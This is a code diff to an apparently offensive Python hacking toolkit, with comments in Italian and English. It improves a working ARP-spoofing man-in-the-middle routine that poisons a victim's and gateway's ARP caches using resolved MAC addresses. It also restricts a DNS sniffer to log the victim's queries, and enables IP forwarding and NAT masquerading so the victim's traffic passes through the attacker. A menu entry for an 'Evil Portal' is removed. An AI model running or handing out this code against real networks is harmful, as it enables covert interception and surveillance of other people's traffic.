@@ -22,7 +22,7 @@ import requests
 import whois
 from colorama import Fore, Style
 from requests.structures import CaseInsensitiveDict
-from scapy.all import sniff, ARP, send, DNSQR, IP
+from scapy.all import sniff, ARP, send, DNSQR, IP, getmacbyip, Ether, sendp, conf
 
 
 username = getpass.getuser()
@@ -537,7 +537,6 @@ def network():
         print(f" [{Fore.WHITE}2{Fore.CYAN}] Port Scanner")
         print(f" [{Fore.WHITE}3{Fore.CYAN}] Web Spy")
         print(f" [{Fore.WHITE}4{Fore.CYAN}] Netcat Listener")
-        print(f" [{Fore.BLACK}5{Fore.CYAN}] Evil Portal")
         print(f"\n [{Style.RESET_ALL}{Fore.RED}0{Fore.CYAN}] Menu{Style.RESET_ALL}")
 
         choice = input(f"{Fore.GREEN} root@{username}/network:~$ {Style.RESET_ALL}")
@@ -575,13 +574,23 @@ def enable_promiscuous(iface):
 
 
 def arp_spoof(victim_ip, gateway_ip, iface):
-    pkt_to_victim = ARP(op=2, pdst=victim_ip, psrc=gateway_ip)
-    pkt_to_gateway = ARP(op=2, pdst=gateway_ip, psrc=victim_ip)
+    conf.iface = iface
+
+    victim_mac = getmacbyip(victim_ip)
+    gateway_mac = getmacbyip(gateway_ip)
+
+    if not victim_mac or not gateway_mac:
+        print(f"{Fore.RED}[!] Impossibile ottenere gli indirizzi MAC. Controlla la connessione di rete.{Style.RESET_ALL}")
+        return
+
+    pkt_to_victim = Ether(dst=victim_mac)/ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac)
+    pkt_to_gateway = Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac)
+
     print(f"{Fore.CYAN}[*] Starting ARP spoofing (MITM)...{Style.RESET_ALL}")
     try:
         while True:
-            send(pkt_to_victim, iface=iface, verbose=False)
-            send(pkt_to_gateway, iface=iface, verbose=False)
+            sendp(pkt_to_victim, iface=iface, verbose=False)
+            sendp(pkt_to_gateway, iface=iface, verbose=False)
             time.sleep(2)
     except KeyboardInterrupt:
         print(f"\n{Fore.RED}[!] ARP spoofing stopped.{Style.RESET_ALL}")
@@ -595,10 +604,7 @@ def dns_sniffer(iface, target_ip=""):
                     print(f"{Fore.GREEN}[+] {packet[IP].src} requested: {domain}{Style.RESET_ALL}")
                 except Exception as e:
                     print(f"{Fore.RED}[-] Error decoding DNS request: {e}{Style.RESET_ALL}")
-    sniff(filter="udp port 53", iface=iface, prn=process_packet, store=False)
-
-
-
+    sniff(filter=f"udp port 53 and src {target_ip}", iface=iface, prn=process_packet, store=False)
 
 def web_spoof():
     try:
@@ -609,7 +615,6 @@ def web_spoof():
         enable_promiscuous(iface)
 
         os.system("sudo sysctl -w net.ipv4.ip_forward=1")
-
         os.system(f"sudo iptables -t nat -A POSTROUTING -o {iface} -j MASQUERADE")
 
         spoof_thread = threading.Thread(target=arp_spoof, args=(victim_ip, gateway_ip, iface), daemon=True)
@@ -621,7 +626,7 @@ def web_spoof():
         except KeyboardInterrupt:
             print(f"\n{Fore.RED}[!] Sniffing stopped.{Style.RESET_ALL}")
     except KeyboardInterrupt:
-        close_program()
+        print(f"\n{Fore.RED}[!] Interrupted by user.{Style.RESET_ALL}")
 
 
 
